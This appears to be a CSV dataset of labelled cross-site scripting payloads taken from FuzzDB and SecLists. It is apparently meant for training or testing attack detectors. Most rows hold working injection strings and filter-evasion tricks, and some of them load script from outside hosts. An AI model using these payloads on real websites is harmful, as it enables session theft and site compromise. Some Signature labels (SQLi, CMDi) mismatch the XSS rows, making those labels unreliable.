Payload,Signature,AttackType,Severity,MITRE,Label,Description
<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This vector injects a new body tag and utilized the onload event to modify the DOM. JSON parenthesis and semicolons are to evade filters.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
XML (locally hosted),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
{{0[a='constructor'][a]('alert(1)')()}},XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
onlayoutcomplete,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Basic JS breaker variant 3,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onactivate,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<script>alert('1')</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<script src=//3334957647/1>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
onloadstart,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<x contenteditable oninput=alert(1)>input here!,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
onbeforeactivate,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This super basic vector breaks HTML attributes,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Obfuscated image tag using hex entities,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"</script>//[""'`-->]]>]</div>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
onmspointerover,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This one is pretty hard to detect due to the total fragmentation. Fragments are built together to a self-executing function.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<span onkeyup=prompt(""XSS"")>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"alert(""Hi there"")",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<!-- IE 10 in IE5-9 Standards mode -->,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
Exploit Description: Assuming you can only fit in a few characters and it filters against ”.js” you can rename your JavaScript file to an image as an XSS vector.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<marquee onstart=confirm('XSS')>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Non-Alpha/Non-Digit,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onmozfullscreenerror,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: Div expression - a variant of this was effective against a real world cross site scripting filter using a newline between the colon and ”expression”,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onmouseout,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<XML SRC=""http://ha.ckers.org/xsstest.xml"" ID=I></XML>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
&#x003c,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<iframe xmlns=""http://www.w3.org/1999/xhtml"" src=""javascript:alert('",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
*['<!--']{},XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
eval('ale'+'rt(0)');,CMDi,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<h1>Drop me</h1>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
top['al\x65rt'](1),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<div id=""98""><div id=d><div style=""font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'"">X</div></div>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<sCriPt x>(((confirm)))``</scRipt x>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"{{'a'.constructor.prototype.charAt=''.valueOf;$eval(""x='\""+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\""'"");}}",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
LAYER,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
&#x03c;,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onwebkitmouseforcedown,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<SCR%00IPT>alert(\""XSS\"")</SCR%00IPT>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"&lt;IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"""><iframe%20src=""http://google.com""%%203E",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Long UTF-8 Unicode w/out Semicolons,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This vector uses HTML wrapped in XML and can be used to circumvent common filters. This works in Gecko based browsers only.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<! '=""foo""><x foo='><img src=x onerror=alert(2)//'>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
' or 2=2,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This vector creates an alert by breaking multiline comments.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<div id=""91"">[A]",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
(%c4%b0) |,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: Spaces and meta chars before the JavaScript in images for XSS (this is useful if the pattern match doesn't take into account spaces in the word ”javascript:” - which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the ”javascript:” keyword. The actual reality is you can have any char from 1-32 in decimal).,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<if expr=""new ActiveXObject('htmlfile').parentWindow.alert(2)""></if>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
.source a+=/al/,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
End title tag,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
alert('33'),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<script>{onerror=eval}throw'=alert\x281337\x29'</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
alert&#40;1&#41,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<textarea onfocus=alert('XSS') autofocus>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"var data = ""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e"";document.documentElement.innerHTML = data;",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This vector utilizes ternary operators to obfuscate JavaScript code which creates new DOM elements.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Backslash-obfuscated XBL injection - variant 5,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"</script>""",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
onend,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<select onfocus=alert('document.domain') autofocus>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
{{constructor.constructor('alert(1)')()}},XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Basic JS breaker variant 9,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<BASE HREF=""javascript:alert('XSS');//"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
prompt(1),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<![><img src=""]><img src=x onerror=alert(39)//"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
META w/additional URL parameter,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<script>confirm(document.cookie)</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"var data = ""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e"";document.head.outerHTML = data;",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<LINK REL=""stylesheet"" HREF=""http://xss.rocks/xss.css"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This vector breaks JS integer assignments.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<!--[if<img src=x onerror=alert(2)//]> -->//[""'`-->]]>]</div>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<div id=""68""><doc xmlns:xlink=""http://www.w3.org/1999/xlink"" xmlns:html=""http://www.w3.org/1999/xhtml"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<! foo=""><script>alert(91)</script>"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<script src=""\\example.com\foo.js""></script> // Safari 5.0//[""'`-->]]>]</div>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
IMG Embedded commands 2,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onforminput,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<set attributeName=""xlink:href"" begin=""accessKey(a)"" to=""//example.com/?a"" />",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
; alert(1);//,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<iframe src=""http://www.example.org/dropHere.html""></iframe>//[""'`-->]]>]</div>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
Exploit Description: This extremely short XSS vector works only when newlines can be injected.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This vector breaks noscript areas and appends an element reacting on mouseover events.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: Multiline Injected JavaScript using ASCII carriage returns (same as above only a more extreme example of this XSS vector).,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<video onloadstart=alert(1)><source>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"document.getElementsByTagName(\'body\')[0].appendChild(_)"")'].sort(toString.constructor);",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<details/**/open/**/ontoggle=alert('XSS')>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<svG/x="">""/oNloaD=confirm()//",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
&#0060;,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
TABLE,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
&#060;,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
HTML wrapped in XML,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
alert(),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
onbeforepaste,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<D3""<""/OncLick=""1>[confirm``]""<"">z",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
onbeforecut,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<script>alert(document.domain)</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<svg><script ?>alert(1),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onmspointerleave,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"`-alert(1)"">'onload=""`<svg/1='",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
| `\uFF1C` (%EF%BC%9C)    | FULLWIDTH LESS­THAN SIGN      | <     | LESS­THAN       |,CMDi,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
alert`1`,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<details open ontoggle=alert(""XSS"")>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<a href="""" onmousedown=""var name = '&#39;;alert(1)//'; alert('smthg')"">Link</a>",SQLi,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: This vector breaks single quoted URL input,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<span onmouseover=prompt(""XSS"")>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
""" or 202",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
(%c5%bf) |,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
JavaScript-breaker using carriage return,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<script x>alert('XSS')<script y>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<img src=`xx:xx`onerror=alert(1)>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
setTimeout`alert\u0028document.domain\u0029`;,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: Mocha (Older Netscape only),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
ondragenter,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This vector breaks JS when placed in double quoted arrays.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
eval(location.hash.slice(1)>#alert(1),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<stylesheet xmlns=""http://www.w3.org/TR/WD-xsl"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
